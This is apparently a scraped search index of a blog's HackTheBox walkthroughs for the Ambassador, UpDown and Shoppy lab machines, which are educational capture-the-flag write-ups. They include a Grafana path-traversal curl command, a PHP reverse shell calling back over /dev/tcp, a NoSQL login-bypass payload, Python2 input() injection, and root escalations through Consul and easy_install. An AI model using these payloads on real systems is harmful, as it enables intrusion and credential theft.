|_http-generator: Hugo 0.94.2 | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) 3000/tcp open ppp? syn-ack | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 302 Found | Cache-Control: no-cache | Content-Type: text/html; charset=utf-8 | Expires: -1 | Location: /login | Pragma: no-cache | Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax | X-Content-Type-Options: nosniff | X-Frame-Options: deny | X-Xss-Protection: 1; mode=block | Date: Sun, 02 Oct 2022 12:24:49 GMT | Content-Length: 29 | href=\"/login\"\u003eFound\u003c/a\u003e. | GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 302 Found | Cache-Control: no-cache | Content-Type: text/html; charset=utf-8 | Expires: -1 | Location: /login | Pragma: no-cache | Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax | X-Content-Type-Options: nosniff | X-Frame-Options: deny | X-Xss-Protection: 1; mode=block | Date: Sun, 02 Oct 2022 12:24:17 GMT | Content-Length: 29 | href=\"/login\"\u003eFound\u003c/a\u003e. | HTTPOptions: | HTTP/1.0 302 Found | Cache-Control: no-cache | Expires: -1 | Location: /login | Pragma: no-cache | Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax | X-Content-Type-Options: nosniff | X-Frame-Options: deny | X-Xss-Protection: 1; mode=block | Date: Sun, 02 Oct 2022 12:24:22 GMT |_ Content-Length: 0 3306/tcp open mysql syn-ack MySQL 8.0.30-0ubuntu0.20.04.2 | mysql-info: | Protocol: 10 | Version: 8.0.30-0ubuntu0.20.04.2 | Thread ID: 95 | Capabilities flags: 65535 | Some Capabilities: SwitchToSSLAfterHandshake, LongPassword, SupportsCompression, Speaks41ProtocolOld, FoundRows, InteractiveClient, LongColumnFlag, IgnoreSigpipes, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ODBCClient, ConnectWithDatabase, SupportsTransactions, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins | Status: Autocommit | Salt: m\\x0C | WCYIcc\\x0Ba,E!!2U|\\x1FM |_ Auth Plugin Name: caching_sha2_password |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) There are multiple ports open so I’ll start with port 80. Website on port 80\rIt’s a website made with hugo (a static site generator).","date":"2023-01-28","objectID":"/hackthebox-ambassador/:1:0","tags":["hackthebox","machines"],"title":"HackTheBox - Ambassador","uri":"/hackthebox-ambassador/"},{"categories":["HackTheBox"],"content":"Foothold Trying out this exploit from exploit-db, we can read local files on the server. Reading the /etc/passwd file\rNow since we can read the local files on the server, what can we read next? I tried reading the /home/developer files like user.txt or ssh keys but it didn’t work because we possibly don’t have enough privilege to read those files. Next I tried reading the default config files. This blog post showed different default files of grafana we can read and get sensitive information from. The default config file /etc/grafana/grafana.ini contains the credentials for the login page. Reading the /etc/grafana/grafana.ini file\rAnd we get the credentials to login. Grafana Dashboard\rI couldn’t find much in the grafana dashboard. Upon further reading the above mentioned blog, we can also read a database file /var/lib/grafana/grafana.db. ┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/ambassador] └─$ curl --path-as-is http://ambassador.htb:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db grafana.db\rNice, we found some credentials for mysql. Since there was port 3306 for mysql open, we can try these credentials there. ┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/ambassador] └─$ mysql -u grafana -h ambassador.htb -p Enter password: dontStandSoCloseToMe63221! Upon enumerating the databses, we found developer credentials in whackywidget db. MySQL [(none)]\u003e show databases; +--------------------+ | Database | +--------------------+ | grafana | | information_schema | | mysql | | performance_schema | | sys | | whackywidget | +--------------------+ 6 rows in set (0.191 sec) MySQL [(none)]\u003e use whackywidget Database changed MySQL [whackywidget]\u003e show tables; +------------------------+ | Tables_in_whackywidget | +------------------------+ | users | +------------------------+ 1 row in set (0.175 sec) MySQL [whackywidget]\u003e select * from users; +-----------+------------------------------------------+ | user | pass | +-----------+------------------------------------------+ | developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | +-----------+------------------------------------------+ 1 row in set (0.237 sec) MySQL [whackywidget]\u003e Using base64 decode to get the password. ┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/ambassador] └─$ echo YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | base64 -d anEnglishManInNewYork027468 Trying these credentials using ssh. ┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/ambassador] └─$ ssh developer@ambassador.htb developer@ambassador.htb's password: anEnglishManInNewYork027468 developer@ambassador:~$ And we’re in. ","date":"2023-01-28","objectID":"/hackthebox-ambassador/:2:0","tags":["hackthebox","machines"],"title":"HackTheBox - Ambassador","uri":"/hackthebox-ambassador/"},{"categories":["HackTheBox"],"content":"user.txt developer@ambassador:~$ whoami developer developer@ambassador:~$ ls -al total 48 drwxr-xr-x 7 developer developer 4096 Sep 14 11:01 . drwxr-xr-x 3 root root 4096 Mar 13 2022 .. lrwxrwxrwx 1 root root 9 Sep 14 11:01 .bash_history -\u003e /dev/null -rw-r--r-- 1 developer developer 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 developer developer 3798 Mar 14 2022 .bashrc drwx------ 3 developer developer 4096 Mar 13 2022 .cache -rw-rw-r-- 1 developer developer 93 Sep 2 02:28 .gitconfig drwx------ 3 developer developer 4096 Mar 14 2022 .gnupg drwxrwxr-x 3 developer developer 4096 Mar 13 2022 .local -rw-r--r-- 1 developer developer 807 Feb 25 2020 .profile drwx------ 3 developer developer 4096 Mar 14 2022 snap drwx------ 2 developer developer 4096 Mar 13 2022 .ssh -rw-r----- 1 developer developer 33 Oct 2 17:34 user.txt developer@ambassador:~$ cat user.txt 1e****************************58 developer@ambassador:~$ ","date":"2023-01-28","objectID":"/hackthebox-ambassador/:3:0","tags":["hackthebox","machines"],"title":"HackTheBox - Ambassador","uri":"/hackthebox-ambassador/"},{"categories":["HackTheBox"],"content":"Privilege Escalation For privilege escalation, linpeas didn’t give much useful information. Checking the processes running as root using pspy, there’s an interesting process. pspy\rOn further enum, there are two folders in the /opt directory. developer@ambassador:/opt$ ls -al total 16 drwxr-xr-x 4 root root 4096 Sep 1 22:13 . drwxr-xr-x 20 root root 4096 Sep 15 17:24 .. drwxr-xr-x 4 consul consul 4096 Mar 13 2022 consul drwxrwxr-x 5 root root 4096 Mar 13 2022 my-app In the my-app folder there’s a git repo. Previous commits in the repo leaked the consul token. consul token\rBtw, for those who don’t know what consul is. Consul\rConsul is a multi-networking tool that offers a fully-featured service mesh solution that solves the networking and security challenges of operating microservices and cloud infrastructure. Consul offers a software-driven approach to routing and segmentation.\rSource: https://learn.hashicorp.com/tutorials/consul/get-started A quick google search revealed that consul HTTP API uses port 8500. netstat\rLooking at this article, consul nodes with a specific configuration allows remote code execution. Further reading the article, we have three conditions that shows that consul agent is vulnerable. Vulnerable agent\rTo check whether script checks are enabled or not, we can look at the /etc/consul.d/consul.hcl file. etc/consul.d/consul.hcl\rSo now we have, API available on 127.0.0.1:8500. Script checks enabled. Compromised ACL Token. For our ease we can forward port 8500 using ssh tunneling to access it locally on our machine. ┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/ambassador] └─$ ssh -L 8000:127.0.0.1:8500 developer@ambassador.htb From here we have two methods to escalate our privileges to root. ","date":"2023-01-28","objectID":"/hackthebox-ambassador/:4:0","tags":["hackthebox","machines"],"title":"HackTheBox - Ambassador","uri":"/hackthebox-ambassador/"},{"categories":["HackTheBox"],"content":"Using Metasploit Using exploit/multi/misc/consul_service_exec. metasploit options\rHere on my local machine, I have access to consul API at 127.0.0.1:8000 so I will set the following options. RHOST -\u003e 127.0.0.1 RPORT -\u003e 8000 ACL_TOKEN -\u003e bb03b43b-1d81-d62b-24b5-39540ee469b5 LHOST -\u003e 10.10.14.10 LPORT -\u003e 4444 Now we run the exploit and get shell as root. shell as root using metasploit\r","date":"2023-01-28","objectID":"/hackthebox-ambassador/:4:1","tags":["hackthebox","machines"],"title":"HackTheBox - Ambassador","uri":"/hackthebox-ambassador/"},{"categories":["HackTheBox"],"content":"Manual Exploit For exploiting the vulnerability manually, we need to create a consul health check script and then register that with the token. Upon reloading the consul, our injected code will get executed. We will inject our malicious code in the health check script. Creating the script in /etc/consul.d/config.d/ as script.hcl check = [ { id = \"1\" args = [\"chmod\", \"4777\", \"/bin/bash\"] interval = \"10s\" } ] Now registering the service and reloading the consul as follows. developer@ambassador:/opt/consul$ consul services register -token=bb03b43b-1d81-d62b-24b5-39540ee469b5 /etc/consul.d/config.d/script.hcl developer@ambassador:/opt/consul$ consul reload -token=bb03b43b-1d81-d62b-24b5-39540ee469b5 Now executing bash -p will give us shell as root. ","date":"2023-01-28","objectID":"/hackthebox-ambassador/:4:2","tags":["hackthebox","machines"],"title":"HackTheBox - Ambassador","uri":"/hackthebox-ambassador/"},{"categories":["HackTheBox"],"content":"root.txt developer@ambassador:/opt/consul$ bash -p bash-5.0# whoami root bash-5.0# cat /root/root.txt 7b****************************ad Thanks for reading! ","date":"2023-01-28","objectID":"/hackthebox-ambassador/:5:0","tags":["hackthebox","machines"],"title":"HackTheBox - Ambassador","uri":"/hackthebox-ambassador/"},{"categories":["HackTheBox"],"content":"Hackthebox medium machine UpDown walkthrough \u0026 tutorial..","date":"2023-01-21","objectID":"/hackthebox-updown/","tags":["hackthebox","machines"],"title":"Hackthebox - UpDown","uri":"/hackthebox-updown/"},{"categories":["HackTheBox"],"content":"This post is focused on the walkthrough of Medium Machine UpDown from HackTheBox. ","date":"2023-01-21","objectID":"/hackthebox-updown/:0:0","tags":["hackthebox","machines"],"title":"Hackthebox - UpDown","uri":"/hackthebox-updown/"},{"categories":["HackTheBox"],"content":"Enumeration Starting out with the initial nmap scan. ┌──(saad👻ssaadakhtarr)-[~/Desktop/hackthebox/machines/updown] └─$ nmap -A -vv -oN nmapN 10.10.11.177 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho+1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI= | 256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl+s5QENjani1 80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Only 2 ports are open so enumerating port 80 first. Website\rThe website serves a basic functionality and checks whether a site is up or down. Functionality\rAlso there is a domain siteisup.htb which we’ll add to our /etc/hosts/ file. Since there’s not much else to look for on the main page, we’ll go for directory and vhost bruteforcing. ┌──(saad👻ssaadakhtarr)-[~/Desktop/hackthebox/machines/updown] └─$ gobuster vhost -u siteisup.htb -w /home/saad/Documents/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 100 -o vhosts =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://siteisup.htb [+] Method: GET [+] Threads: 100 [+] Wordlist: /home/saad/Documents/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/09/10 07:31:21 Starting gobuster in VHOST enumeration mode =============================================================== Found: dev.siteisup.htb (Status: 403) [Size: 281] =============================================================== 2022/09/10 07:31:32 Finished =============================================================== Found a subdomain dev.siteisup.htb. Visiting the above domain, we get a 403. 403 Forbidden\rGoing for directory bruteforcing now. ┌──(saad👻ssaadakhtarr)-[~/Desktop/hackthebox/machines/updown] └─$ gobuster dir -u http://siteisup.htb/ -w /usr/share/wordlists/dirb/common.txt -o dir -t 100 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://siteisup.htb/ [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/09/10 07:32:47 Starting gobuster in directory enumeration mode =============================================================== /.hta (Status: 403) [Size: 277] /.htaccess (Status: 403) [Size: 277] /.htpasswd (Status: 403) [Size: 277] /dev (Status: 301) [Size: 310] [--\u003e http://siteisup.htb/dev/] /index.php (Status: 200) [Size: 1131] /server-status (Status: 403) [Size: 277] =============================================================== 2022/09/10 07:32:55 Finished =============================================================== We found an interesting directory dev. Doing dir bruteforcing on that directory gives us a .git repo. ┌──(saad👻ssaadakhtarr)-[~/Desktop/hackthebox/machines/updown] └─$ gobuster dir -u http://siteisup.htb/dev -w /usr/share/wordlists/dirb/common.txt -o dir-dev -t 100 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://siteisup.htb/dev [+] Method: GET [+] Threads: 100 [+] ","date":"2023-01-21","objectID":"/hackthebox-updown/:1:0","tags":["hackthebox","machines"],"title":"Hackthebox - UpDown","uri":"/hackthebox-updown/"},{"categories":["HackTheBox"],"content":"Foothold Now what we need is to upload a reverse shell in .phar file, then find the path of the file and then execute it to get the reverse shell. Looking further in the source code of checker.php file. Uploaded file directory\rThere’s an uploads directory where it adds another directory with the name of md5 sum of the current timestamp. So if we upload a shell.phar file then the uploaded file will be at http://dev.siteisup.htb/uploads/md5_sum_of_current_time/shell.phar. We can have a look at http://dev.siteisup.htb/uploads directly right after uploading our file. But the file gets deleted as soon as it is read by the program. File Deletion\rWhat we can do is create a longer file with a bunch of urls to check and put our reverse shell code right after. This will hopefully give us enough time to execute the file. Also notice that a bunch of php functions are disabled when we execute our reverse shell so the only shell that worked was with the proc_open function. I wrote the shell modifying an example on proc_open manual page. shell.phar file. http://test.com http://test.com http://test.com ... ... ... \u003c?php $descriptorspec = array( 0 =\u003e array(\"pipe\", \"r\"), // stdin is a pipe that the child will read from 1 =\u003e array(\"pipe\", \"w\"), // stdout is a pipe that the child will write to 2 =\u003e array(\"file\", \"/tmp/error-output.txt\", \"a\") // stderr is a file to write to ); $cwd = '/tmp'; $env = array('some_option' =\u003e 'aeiou'); $process = proc_open('bash', $descriptorspec, $pipes, $cwd, $env); if (is_resource($process)) { // $pipes now looks like this: // 0 =\u003e writeable handle connected to child stdin // 1 =\u003e readable handle connected to child stdout // Any error output will be appended to /tmp/error-output.txt fwrite($pipes[0], 'bash -i \u003e\u0026 /dev/tcp/10.10.14.64/4444 0\u003e\u00261'); fclose($pipes[0]); echo stream_get_contents($pipes[1]); fclose($pipes[1]); // It is important that you close any pipes before calling // proc_close in order to avoid a deadlock $return_value = proc_close($process); echo \"command returned $return_value\\n\"; } ?\u003e Executing the shell we get the connection back in our machine. Shell as www-data\r","date":"2023-01-21","objectID":"/hackthebox-updown/:2:0","tags":["hackthebox","machines"],"title":"Hackthebox - UpDown","uri":"/hackthebox-updown/"},{"categories":["HackTheBox"],"content":"www-data -\u003e developer Looking for interesting files, we have two files in the /home/developer/dev/ directory. /home/developer/dev/\rOne of the files is an elf binary while the other is a python file. siteisup binary. siteisup binary\rExecuting and looking at the strings of the binary, we can conclude that this is calling out the other file siteisup_test.py file. strings siteisup\rSo what exactly the file siteisup_test.py does? Well it also provides similar functionality and checks whether the provided site is up or not. Contents of siteisup_test.py import requests url = input(\"Enter URL here:\") page = requests.get(url) if page.status_code == 200: print \"Website is up\" else: print \"Website is down\" Running the binary, when we provide http://siteisup.htb in input it should’ve return Website is up or Website is down. But instead it throws out an error. Running the binary\rNow if we provide the same input but in string format as \"http://siteisup.htb\" it returns the correct output. Correct output\rWait but what difference did that make? By default the /usr/bin/python is running python2 so the file siteisup_test.py is also being run in python2. Looking at this article, we can see that the input() function of python2 is vulnerable. If we just use plain input() in python2, instead of saving it in the variable as string, it takes it as an expression and runs our provided input. We can take advantage of this behavior and try running system commands through this. By reading this stackoverflow answer, I made an expression to run code through the binary. By provide the input __import__('os').system('id'), we can see the output of the command. Injected command\rNice! we can run commands as developer. Now simply read the ssh private key and log in as developer. Reading the ssh key\rAnd we’re in! ","date":"2023-01-21","objectID":"/hackthebox-updown/:3:0","tags":["hackthebox","machines"],"title":"Hackthebox - UpDown","uri":"/hackthebox-updown/"},{"categories":["HackTheBox"],"content":"user.txt ┌──(saad👻ssaadakhtarr)-[~/Desktop/hackthebox/machines/updown] └─$ ssh -i id_rsa developer@siteisup.htb developer@updown:~$ whoami developer developer@updown:~$ cat user.txt b0****************************af ","date":"2023-01-21","objectID":"/hackthebox-updown/:4:0","tags":["hackthebox","machines"],"title":"Hackthebox - UpDown","uri":"/hackthebox-updown/"},{"categories":["HackTheBox"],"content":"Privilege Escalation Checking what we can run as sudo. developer@updown:~$ sudo -l Matching Defaults entries for developer on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User developer may run the following commands on localhost: (ALL) NOPASSWD: /usr/local/bin/easy_install We can run easy_install as root without password. Simply checking and running the gtfobins exploit of this binary we can escalate as root. developer@updown:~$ TF=$(mktemp -d) developer@updown:~$ echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh \u003c$(tty) \u003e$(tty) 2\u003e$(tty)')\" \u003e $TF/setup.py developer@updown:~$ sudo easy_install $TF WARNING: The easy_install command is deprecated and will be removed in a future version. Processing tmp.Co2hiEXh3z Writing /tmp/tmp.Co2hiEXh3z/setup.cfg Running setup.py -q bdist_egg --dist-dir /tmp/tmp.Co2hiEXh3z/egg-dist-tmp-nK7eay # whoami root ","date":"2023-01-21","objectID":"/hackthebox-updown/:5:0","tags":["hackthebox","machines"],"title":"Hackthebox - UpDown","uri":"/hackthebox-updown/"},{"categories":["HackTheBox"],"content":"root.txt root@updown:/tmp/tmp.Co2hiEXh3z# cd /root root@updown:~# cat root.txt 31****************************af Thanks for reading! ","date":"2023-01-21","objectID":"/hackthebox-updown/:6:0","tags":["hackthebox","machines"],"title":"Hackthebox - UpDown","uri":"/hackthebox-updown/"},{"categories":["HackTheBox"],"content":"Hackthebox easy machine Shoppy walkthrough \u0026 tutorial..","date":"2023-01-14","objectID":"/hackthebox-shoppy/","tags":["hackthebox","machines"],"title":"Hackthebox - Shoppy","uri":"/hackthebox-shoppy/"},{"categories":["HackTheBox"],"content":"This post is focused on the walkthrough of Easy Machine Shoppy from HackTheBox. ","date":"2023-01-14","objectID":"/hackthebox-shoppy/:0:0","tags":["hackthebox","machines"],"title":"Hackthebox - Shoppy","uri":"/hackthebox-shoppy/"},{"categories":["HackTheBox"],"content":"Enumeration Starting out with the initial nmap scan. ┌──(saad👻ssaadakhtarr)-[~/Desktop/hackthebox/machines/shoppy] └─$ nmap -A -vv 10.129.12.86 -oN nmapN PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDApZi3Kltv1yDHTatw6pKZfuIcoHfTnVe0W1yc9Uw7NMUinxjjQaQ731J+eCTwd8hBcZT6HQwcchDNR50Lwyp2a/KpXuH2my+2/tDvISTRTgwfMy1sDrG3+KPEzBag07m7ycshp8KhrRq0faHPrEgcagkb5T8mnT6zr3YonzoMyIpT+Q1O0JAre6GPgJc9im/tjaqhwUxCH5MxJCKQxaUf2SlGjRCH5/xEkNO20BEUYokjoAWwHUWjK2mlIrBQfd4/lcUzMnc5WT9pVBqQBw+/7LbFRyH4TLmGT9PPEr8D8iygWYpuG7WFOZlU8oOhO0+uBqZFgJFFOevq+42q42BvYYR/z+mFox+Q2lz7viSCV7nBMdcWto6USWLrx1AkVXNGeuRjr3l0r/698sQjDy5v0GnU9cMHeYkMc+TuiIaJJ5oRrSg/x53Xin1UogTnTaKLNdGkgynMqyVFklvdnUngRSLsXnwYNgcDrUhXxsfpDu8HVnzerT3q27679+n5ZFM= | 256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHiKrH/B/4murRCo5ju2KuPgkMjQN3Foh7EifMHEOwmoDNjLYBfoAFKgBnrMA9GzA+NGhHVa6L8CAxN3eaGXXMo= | 256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBRsWhJQCRHjDkHy3HkFLMZoGqCmM3/VfMHMm56u0Ivk 80/tcp open http syn-ack nginx 1.23.1 |_http-server-header: nginx/1.23.1 |_http-title: Shoppy Wait Page | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-favicon: Unknown favicon MD5: D5F0A0ADD0BFBB2BC51607F78ECE2F57 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Only 2 ports are open. We’ll go for port 80. We have a website redirecting to shoppy.htb. We’ll add this domain in /etc/hosts. Website\rNot much to look at on the main site so we’ll go for the dir bruteforcing. ┌──(saad👻ssaadakhtarr)-[~/Desktop/hackthebox/machines/shoppy] └─$ gobuster dir -u http://shoppy.htb/ -w /usr/share/wordlists/dirb/common.txt -o dir /admin (Status: 302) [Size: 28] [--\u003e /login] /Admin (Status: 302) [Size: 28] [--\u003e /login] /ADMIN (Status: 302) [Size: 28] [--\u003e /login] /assets (Status: 301) [Size: 179] [--\u003e /assets/] /css (Status: 301) [Size: 173] [--\u003e /css/] /exports (Status: 301) [Size: 181] [--\u003e /exports/] /favicon.ico (Status: 200) [Size: 213054] /fonts (Status: 301) [Size: 177] [--\u003e /fonts/] /images (Status: 301) [Size: 179] [--\u003e /images/] /js (Status: 301) [Size: 171] [--\u003e /js/] /login (Status: 200) [Size: 1074] /Login (Status: 200) [Size: 1074] Visiting /admin we get redirected to /login which is a login page. Login Page\rDefault credentials didn’t work here so we can try for sqli. Adding a ' at the end of username we are getting a 504. 504\rOn enumerating further, I also tried some NoSQL payloads out of which one of the payload redirected to the admin panel. Payload: admin' || ' Admin Panel\rLooking around in admin panel, the search for users page searches for the known users and returns a json file containing that user’s id, username, and password. Search Users Page\rexport-search.json\rI tried cracking the admin’s password with john but no luck with the rockyou.txt wordlist. Also notice that we can enumerate usernames as well with the search users page. Using wfuzz we can enumerate other users as well. I used names.txt from the SecLists. ┌──(saad👻ssaadakhtarr)-[~/Desktop/hackthebox/machines/shoppy] └─$ wfuzz -H \"Host: shoppy.htb\" -w users.txt --ss \"Download export\" -b \"connect.sid=s%3A41NRGQUoz12IMj3vHfsgSbaY2yFHZ-DT.%2F1vdICypeZqYvyhWQXkgxKJoPWuq9SEqCr9jmgSUwUU\" http://shoppy.htb/admin/search-users?username=FUZZ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000086: 200 55 L 160 W 2720 Ch \"admin\" 000004909: 200 55 L 160 W 2720 Ch \"josh\" And we got another username josh. We can look at the password of this user and try cracking it as well. ┌──(saad👻ssaadakhtarr)-[~/Desktop/hackthebox/machines/shoppy] └─$ john --wordlist=/home/saad/Documents/wordlists/r","date":"2023-01-14","objectID":"/hackthebox-shoppy/:1:0","tags":["hackthebox","machines"],"title":"Hackthebox - Shoppy","uri":"/hackthebox-shoppy/"},{"categories":["HackTheBox"],"content":"Foothold I tried looking for virtual hosts with different wordlists and this wordlist from SecLists found a valid subdomain for us. ┌──(saad👻ssaadakhtarr)-[~/Desktop/hackthebox/machines/shoppy] └─$ gobuster vhost -u http://shoppy.htb/ -w /home/saad/Documents/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -o vhost -t 100 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://shoppy.htb/ [+] Method: GET [+] Threads: 100 [+] Wordlist: /home/saad/Documents/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/09/18 06:34:35 Starting gobuster in VHOST enumeration mode =============================================================== Found: mattermost.shoppy.htb (Status: 200) [Size: 3122] =============================================================== 2022/09/18 06:38:23 Finished =============================================================== Let’s add mattermost.shoppy.htb to /etc/hosts. Visiting the new subdomain revealed another login page. mattermost.shoppy.htb\rTrying the credentials of josh we found above we can successfully log in. Chat Application\rLooking around the messages in different channels, we found some credentials for user jaeger in the Deploy Machine channel. Deploy Machine Channel\rWe can use these credentials to ssh into the machine. And we’re in. ","date":"2023-01-14","objectID":"/hackthebox-shoppy/:2:0","tags":["hackthebox","machines"],"title":"Hackthebox - Shoppy","uri":"/hackthebox-shoppy/"},{"categories":["HackTheBox"],"content":"user.txt ┌──(saad👻ssaadakhtarr)-[~/Desktop/hackthebox/machines/shoppy] └─$ ssh jaeger@shoppy.htb jaeger@shoppy.htb's password: Sh0ppyBest@pp! jaeger@shoppy:~$ whoami jaeger jaeger@shoppy:~$ ls -al total 96 drwxr-xr-x 19 jaeger jaeger 4096 Jul 22 15:56 . drwxr-xr-x 4 root root 4096 Jul 22 13:12 .. lrwxrwxrwx 1 jaeger jaeger 9 Jul 22 11:42 .bash_history -\u003e /dev/null -rw-r--r-- 1 jaeger jaeger 220 Jul 22 11:39 .bash_logout -rw-r--r-- 1 jaeger jaeger 3723 Jul 22 12:05 .bashrc drwx------ 14 jaeger jaeger 4096 Jul 22 12:55 .cache drwx------ 12 jaeger jaeger 4096 Jul 22 13:47 .config lrwxrwxrwx 1 jaeger jaeger 9 Jul 22 15:56 .dbshell -\u003e /dev/null drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 11:40 Desktop drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 11:40 Documents drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 11:40 Downloads drwx------ 3 jaeger jaeger 4096 Jul 23 03:10 .gnupg drwxr-xr-x 3 jaeger jaeger 4096 Jul 22 11:40 .local -rw------- 1 jaeger jaeger 0 Jul 22 15:55 .mongorc.js drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 11:40 Music drwxr-xr-x 4 jaeger jaeger 4096 Jul 22 12:06 .npm drwxr-xr-x 5 jaeger jaeger 4096 Jul 22 12:06 .nvm drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 11:40 Pictures drwxr-xr-x 5 jaeger jaeger 4096 Sep 18 03:50 .pm2 -rw-r--r-- 1 jaeger jaeger 807 Jul 22 11:39 .profile drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 11:40 Public drwxr-xr-x 7 jaeger jaeger 4096 Jul 23 03:42 ShoppyApp -rwxr--r-- 1 jaeger jaeger 130 Jul 22 12:25 shoppy_start.sh drwx------ 2 jaeger jaeger 4096 Jul 22 11:42 .ssh drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 11:40 Templates -rw-r----- 1 jaeger jaeger 33 Sep 18 03:51 user.txt drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 11:40 Videos jaeger@shoppy:~$ cat user.txt 78****************************bd ","date":"2023-01-14","objectID":"/hackthebox-shoppy/:3:0","tags":["hackthebox","machines"],"title":"Hackthebox - Shoppy","uri":"/hackthebox-shoppy/"},{"categories":["HackTheBox"],"content":"Privilege Escalation Running sudo -l we can run /home/deploy/password-manager as user deploy. jaeger@shoppy:~$ sudo -l Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-manager The file password-manager is a 64-bit ELF binary. password-manager\rWe can run the binary to analyze it’s behavior. jaeger@shoppy:~$ sudo -u deploy /home/deploy/./password-manager Welcome to Josh password manager! Please enter your master password: test Access denied! This incident will be reported ! Upon running the binary, it asks for a password and on giving a wrong password it shows access denied. Reading the contents of the binary using cat we can see the password in plain text. cat password-manager\rOn entering the password Sample, we get credentials for the user deploy. jaeger@shoppy:~$ sudo -u deploy /home/deploy/./password-manager Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Deploying@pp! jaeger@shoppy:~$ Switching to deploy user. jaeger@shoppy:~$ su deploy Password: Deploying@pp! deploy@shoppy:/home/jaeger$ whoami deploy 